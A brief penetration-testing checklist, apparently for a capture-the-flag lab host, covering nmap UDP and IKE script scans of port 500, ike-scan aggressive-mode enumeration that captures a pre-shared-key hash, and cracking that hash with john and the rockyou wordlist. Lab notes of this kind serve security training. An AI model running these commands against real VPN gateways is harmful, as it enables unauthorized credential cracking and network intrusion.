- [ ] Service Fingerprinting
- [ ] Enumeration

Service Fingerprinting!!!
```sh
nmap -sU -p500 10.10.11.87
nmap -sU -p500 --script ike-* 10.10.11.87
```
Enumeration!!!
```sh
# basic scan 
ike-scan -M -A 10.10.11.87
# psk
ike-scan -M -A -n ike@expressway.htb --pskcrack=hash.txt 10.10.11.87
ikescan2john hash.txt > j.txt
john --wordlist=/usr/share/wordlists/rockyou.txt j.txt 
```
References!!!
[IPSEC IKE Pntesting](https://angelica.gitbook.io/hacktricks/network-services-pentesting/ipsec-ike-vpn-pentesting)